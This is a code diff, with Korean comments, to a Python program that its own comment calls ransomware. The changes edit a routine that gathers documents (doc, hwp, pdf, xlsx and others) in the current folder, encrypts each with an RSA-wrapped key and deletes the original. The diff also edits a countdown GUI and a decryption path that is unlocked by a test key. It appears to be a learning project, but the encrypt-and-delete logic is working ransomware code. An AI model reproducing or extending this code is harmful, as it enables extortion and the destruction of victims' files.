@@ -285,7 +285,8 @@ class RealMain:
 
     # /////////////////////////////////////////////////////////////////////////////////////////////////////////////////파일 리스팅 함수
 
-    def listFiles(self, path):
+    ##! 파일 리스팅함수 약간 수정
+    def encListFiles(self, path):
         filelist = []
         extlist = \
             ['doc', 'docx', 'txt', 'hwp', 'ppt', 'pptx', 'xlsx', 'xls', 'pdf',
@@ -301,18 +302,19 @@ class RealMain:
                     else:
                         continue
 
-        print("filelist: \n", filelist)
+        print("enc_filelist: \n", filelist)
         return filelist
 
     def decListFiles(self, path):
-        dec_filelist = []
+        filelist = []
         for name in os.listdir(path):
             if name.endswith(".antdd"):
-                dec_filelist.append(name)
+                filelist.append(name)
             else:
                 continue
-        print("dec_filelist: \n", dec_filelist)
-        return dec_filelist
+        print("dec_filelist: \n", filelist)
+        return filelist
+    ##! 여기까지
 
     # /////////////////////////////////////////////////////////////////////////////////////////////////////////////////실제로 실행되는 함수
     def run(self):
@@ -320,7 +322,8 @@ class RealMain:
         print("비밀키는 : ", self.private_key)
         print("test_input_key는 : ", str(self.test_input_key))  # 랜섬웨어 자체랑 관계 없음 다 지워버려야함
 
-        enc_targetlist = self.listFiles(os.getcwd())  # os.getcwd는 해당 폴더에서 가져옴.
+        ##! 암호화 및 타겟 파일 삭제
+        enc_targetlist = self.encListFiles(os.getcwd())  # os.getcwd는 해당 폴더에서 가져옴.
 
         for enc_target in enc_targetlist:
             if enc_target.split('.')[-1] == 'antdd':
@@ -328,6 +331,7 @@ class RealMain:
             enc(self.key, PKCS1_OAEP.new(RSA.importKey(self.public_key)), enc_target,
                 out_filename=None)
             os.remove(enc_target)
+        ##! 여기까지
 
         th1 = threading.Thread(target=startTimer, args=[self.myGui, os.getcwd()])
         th1.daemon = True
@@ -341,12 +345,17 @@ class RealMain:
         if (str(self.test_input_key) == gui_input):  #이건 테스트용
             # if (self.private_key == gui_input): # 메일 서버로 private key 연결해와야함
 
-            for file in self.decListFiles(os.getcwd()):  # 현재 디렉토리 내부에 antdd를 파일리스트로 가져온다
-                dec(PKCS1_OAEP.new(RSA.importKey(self.private_key)), file, out_filename=None)
+            ##! 복호화 및 타겟파일 삭제
+            dec_targetlist = self.decListFiles(os.getcwd())
+            for dec_target in dec_targetlist:  # 현재 디렉토리 내부에 antdd를 파일리스트로 가져온다
+                dec(PKCS1_OAEP.new(RSA.importKey(self.private_key)), dec_target, out_filename=None)
+                os.remove(dec_target)
+            ##! 여기까지
+
                 # 입력한 비밀키를 바탕으로 dec 근데 파라미터 private_key 아니고 input이여야하는데 encoding 문제배제하려고 일단은 private key 사용함 11/24
             self.myGui.finalGui()
-
             # auto_remove 호출
+
         else:
             print("\nself.test_input_key!=input")
 
